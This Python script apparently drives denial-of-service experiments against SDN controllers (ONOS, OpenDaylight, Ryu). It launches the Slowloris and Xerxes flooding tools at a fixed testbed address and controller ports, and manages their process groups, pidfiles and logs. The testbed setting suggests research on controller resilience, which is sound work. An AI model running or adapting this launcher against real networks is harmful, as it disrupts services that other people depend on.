#!/usr/bin/env python3
import os
import time
import signal
import atexit
import shutil
import subprocess

PIDFILES = {
    "slowloris": "/tmp/slowloris.pid",
    "xerxes":   "/tmp/xerxes.pid"
}
LOGFILE = "/tmp/attackload.log"

def _is_pgid_alive(pgid: int) -> bool:
    try:
        # send signal 0 to process group to check if exists
        os.killpg(pgid, 0)
        return True
    except ProcessLookupError:
        return False
    except PermissionError:
        # exists but we don't have permission to signal it
        return True
    except Exception:
        return False

def _write_pidfile(attack_name: str, pgid: int):
    pidfile = PIDFILES[attack_name]
    with open(pidfile, "w") as f:
        f.write(str(pgid))

def _read_pidfile(attack_name: str):
    pidfile = PIDFILES[attack_name]
    if not os.path.exists(pidfile):
        return None
    try:
        with open(pidfile, "r") as f:
            val = int(f.read().strip())
            return val
    except Exception:
        return None

def _remove_pidfile(attack_name: str):
    pidfile = PIDFILES[attack_name]
    try:
        if os.path.exists(pidfile):
            os.remove(pidfile)
    except Exception:
        pass

def start_attack(attack_name: str, controller_name: str, controller_ip: str = None, rest_port: int = None) -> int:
    """
    Start 'slowloris' or 'xerxes' as a background process group.
    Returns pgid on success, raises on failure.
    """
    if attack_name not in PIDFILES:
        raise ValueError("Unknown attack_name: " + attack_name)

    # If already running according to pidfile, check and return
    existing_pgid = _read_pidfile(attack_name)
    if existing_pgid and _is_pgid_alive(existing_pgid):
        print(f"{attack_name} already running (pgid={existing_pgid}).")
        return existing_pgid
    else:
        _remove_pidfile(attack_name)

    # Ensure log directory exists
    os.makedirs(os.path.dirname(LOGFILE), exist_ok=True)

    if attack_name == "slowloris":

        target_ip = controller_ip if controller_ip else '11.0.0.10'
        # Decide target based on controller
        if controller_name == 'onos':
            target_port = rest_port if rest_port else 8181
        elif controller_name in ('odl', 'ryu'):
            target_port = rest_port if rest_port else (8080 if controller_name == 'ryu' else 8181)

        else:
            raise ValueError(f"Unknown controller: {controller_name}")

        # Prefer absolute binary if available
        slowloris_bin = shutil.which("slowloris") or "slowloris"
        cmd = [slowloris_bin, target_ip, "-p", str(target_port)]
        cwd = None

    elif attack_name == "xerxes":
        if controller_name == 'onos':
            target_ip = '11.0.0.10'
            target_port = '9876'
        elif controller_name in ('odl', 'ryu'):
            target_ip = '11.0.0.10'
            target_port = '6653'
        else:
            raise ValueError(f"Unknown controller: {controller_name}")

        # Assume xerxes lives in XERXES/ relative to cwd; use its executable there
        cwd = os.path.join(os.path.dirname(__file__), "XERXES")
        xerxes_path = "./xerxes"    # relativo ao cwd
        cmd = [xerxes_path, target_ip, str(target_port)]
    else:
        raise ValueError("Unsupported attack: " + attack_name)

    print(f"Starting {attack_name}: {' '.join(cmd)} (cwd={cwd})")

    # Open log file and start process in new process group
    with open(LOGFILE, "a") as logfile:
        proc = subprocess.Popen(
            cmd,
            stdout=logfile,
            stderr=subprocess.STDOUT,
            preexec_fn=os.setsid,  # start a new process group
            cwd=cwd,
            text=True
        )

    pgid = os.getpgid(proc.pid)
    _write_pidfile(attack_name, pgid)
    print(f"{attack_name} started (pid={proc.pid}, pgid={pgid}). Logs -> {LOGFILE}")
    return pgid

def stop_attack(attack_name: str, graceful_timeout: float = 2.0):
    """
    Stop a running attack. First attempts to kill by pidfile (SIGTERM -> wait -> SIGKILL).
    If no pidfile found, falls back to pkill -f attack_name.
    """
    if attack_name not in PIDFILES:
        print("Unknown attack:", attack_name)
        return

    pgid = _read_pidfile(attack_name)
    if pgid:
        print(f"Stopping {attack_name} by process group {pgid} (SIGTERM)...")
        try:
            os.killpg(pgid, signal.SIGTERM)
        except ProcessLookupError:
            print("Process group not found.")
        except PermissionError:
            print("No permission to kill process group.")
        except Exception as e:
            print("Error sending SIGTERM:", e)

        # Wait a little for graceful exit
        t0 = time.time()
        while time.time() - t0 < graceful_timeout:
            if not _is_pgid_alive(pgid):
                break
            time.sleep(0.1)

        if _is_pgid_alive(pgid):
            print(f"{attack_name} still alive, sending SIGKILL...")
            try:
                os.killpg(pgid, signal.SIGKILL)
            except ProcessLookupError:
                pass
            except Exception as e:
                print("Error sending SIGKILL:", e)
        else:
            print(f"{attack_name} stopped gracefully.")
        _remove_pidfile(attack_name)
        return

    # fallback to pkill -f <attack_name>
    print(f"No pidfile found for {attack_name}. Falling back to pkill -f {attack_name}")
    try:
        subprocess.run(["pkill", "-f", attack_name], check=True)
        print("pkill succeeded.")
    except subprocess.CalledProcessError:
        print("No process matched pkill for", attack_name)
    except Exception as e:
        print("Error running pkill:", e)






# Example convenience wrappers you can call from your existing code:
def run_slowloris(controller_name, controller_ip=None, rest_port=None):
    return start_attack("slowloris", controller_name, controller_ip, rest_port)

def run_xerxes(controller_name, controller_ip=None, rest_port=None):
    return start_attack("xerxes", controller_name, controller_ip, rest_port)

def stop_connection(attack_name):
    return stop_attack(attack_name)
